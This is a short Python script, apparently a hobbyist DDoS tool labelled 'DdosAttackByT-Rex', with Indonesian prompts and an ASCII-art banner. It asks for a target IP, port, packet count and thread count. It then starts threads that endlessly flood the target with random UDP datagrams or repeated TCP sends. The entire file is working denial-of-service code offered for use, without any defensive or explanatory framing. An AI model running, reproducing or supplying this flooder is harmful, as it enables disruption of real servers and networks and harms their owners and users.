import random

import socket

import threading

import os



os.system("clear")

print('''\033[94m

████████╗░░░██████╗░███████╗██╗░░██╗
╚══██╔══╝░░░██╔══██╗██╔════╝╚██╗██╔╝
░░░██║░░░░░░██████╔╝█████╗░░░╚███╔╝░
░░░██║░░░░░░██╔══██╗██╔══╝░░░██╔██╗░
░░░██║░░░██╗██║░░██║███████╗██╔╝╚██╗
░░░╚═╝░░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

''')

ip = str(input("DdosAttackByT-Rex |IP  :"))

port = int(input("DdosAttackByT-Rex |Port  :"))

choice = str(input("Gas Gak? (y/n) >>>:"))

times = int(input("DdosAttackByT-Rex |Packet  :"))

threads = int(input("DdosAttackByT-Rex |Threads  :"))

def run():

    data = random._urandom(1159)

    i = random.choice(("[𝒙]","[𝒙]","[𝒙]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            addr = (str(ip),int(port))

            for x in range(times):

                s.sendto(data,addr)

            print("Mulai Mengirim Packet Ke Target")

        except:

            print("[!] Down!!!")



def run2():

    data = random._urandom(16)

    i = random.choice(("[𝒙]","[𝒙]","[𝒙]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((ip,port))

            s.send(data)

            for x in range(times):

                s.send(data)

            print(i +" T-Rex nih bos!!!")

        except:

            s.close()

            print("[!] Down!!!")



for y in range(threads):

    if choice == 'y':

        th = threading.Thread(target = run)

        th.start()

    else:

        th = threading.Thread(target = run2)

        th.start()